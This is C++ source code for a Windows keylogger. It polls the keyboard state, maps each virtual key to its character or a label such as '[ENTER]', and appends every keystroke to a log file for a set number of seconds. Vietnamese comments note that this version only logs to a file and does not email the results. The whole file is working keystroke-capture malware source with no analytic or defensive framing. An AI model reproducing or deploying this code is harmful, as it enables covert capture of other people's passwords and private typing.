#include <chrono>
#include <thread>
#include <map>
#include <filesystem>
#include "lib.h"
#include "keylogger.h"

bool isShiftPressed() { return (GetAsyncKeyState(VK_SHIFT) & 0x8000); }

bool isCapsLockOn() { return (GetKeyState(VK_CAPITAL) & 0x0001); }

std::string getCharFromKey(int key) {
  // Map special keys
  static std::map<int, std::string> specialKeys = {
      {VK_LBUTTON, "[LMB]"},     {VK_RBUTTON, "[RMB]"},
      {VK_MBUTTON, "[MMB]"},     {VK_BACK, "[BACKSPACE]"},
      {VK_TAB, "[TAB]"},         {VK_RETURN, "[ENTER]"},
      {VK_SHIFT, "[SHIFT]"},     {VK_LSHIFT, "[LSHIFT]"},
      {VK_RSHIFT, "[RSHIFT]"},   {VK_CONTROL, "[CTRL]"},
      {VK_LCONTROL, "[LCTRL]"},  {VK_RCONTROL, "[RCTRL]"},
      {VK_MENU, "[ALT]"},        {VK_LMENU, "[LALT]"},
      {VK_RMENU, "[RALT]"},      {VK_CAPITAL, "[CAPSLOCK]"},
      {VK_ESCAPE, "[ESC]"},      {VK_SPACE, " "},
      {VK_PRIOR, "[PAGEUP]"},    {VK_NEXT, "[PAGEDOWN]"},
      {VK_END, "[END]"},         {VK_HOME, "[HOME]"},
      {VK_LEFT, "[LEFT]"},       {VK_UP, "[UP]"},
      {VK_RIGHT, "[RIGHT]"},     {VK_DOWN, "[DOWN]"},
      {VK_INSERT, "[INS]"},      {VK_DELETE, "[DEL]"},
      {VK_NUMLOCK, "[NUMLOCK]"}, {VK_SCROLL, "[SCROLLLOCK]"},
      {VK_PRINT, "[PRINTSCR]"},  {VK_PAUSE, "[PAUSE]"},
      {VK_SNAPSHOT, "[PRTSC]"},
  };

  // Add function keys F1–F24
  for (int i = 1; i <= 24; ++i) {
    specialKeys[VK_F1 + i - 1] = "[F" + std::to_string(i) + "]";
  }

  if (specialKeys.count(key)) {
    return specialKeys[key];
  }

  BYTE keyboardState[256];
  GetKeyboardState(keyboardState);

  if (isShiftPressed()) keyboardState[VK_SHIFT] |= 0x80;

  WCHAR buffer[4] = {0};
  UINT scanCode = MapVirtualKey(key, MAPVK_VK_TO_VSC);

  int result = ToUnicode(key, scanCode, keyboardState, buffer, 4, 0);
  if (result > 0) {
    std::wstring ws(buffer);
    std::string ch(ws.begin(), ws.end());
    if (!isShiftPressed() && !isCapsLockOn()) {
      ch[0] = std::tolower(ch[0]);
    }
    return ch;
  }

  return "[UNK:" + std::to_string(key) + "]";
}

// Chỉ ghi keylog vào file, không gửi email
void start_keylogger(const std::string& filename, int durationSeconds) {
  // Tạo thư mục nếu chưa có
  std::filesystem::create_directories(
      std::filesystem::path(filename).parent_path());

  std::ofstream log(filename);
  if (!log.is_open()) {
    std::cerr << "Failed to open log file: " << filename << std::endl;
    return;
  }

  std::cout << "[Keylogger] Starting keylogger for " << durationSeconds
            << " seconds, output: " << filename << std::endl;

  auto startTime = std::chrono::steady_clock::now();
  while (std::chrono::steady_clock::now() - startTime <
         std::chrono::seconds(durationSeconds)) {
    for (int key = 8; key <= 255; ++key) {
      if (GetAsyncKeyState(key) & 0x1) {
        std::string keyStr = getCharFromKey(key);
        log << keyStr;
        log.flush();
      }
    }
    std::this_thread::sleep_for(std::chrono::milliseconds(5));
  }

  log.close();
  std::cout << "[Keylogger] Keylogger finished, saved to: " << filename
            << std::endl;
}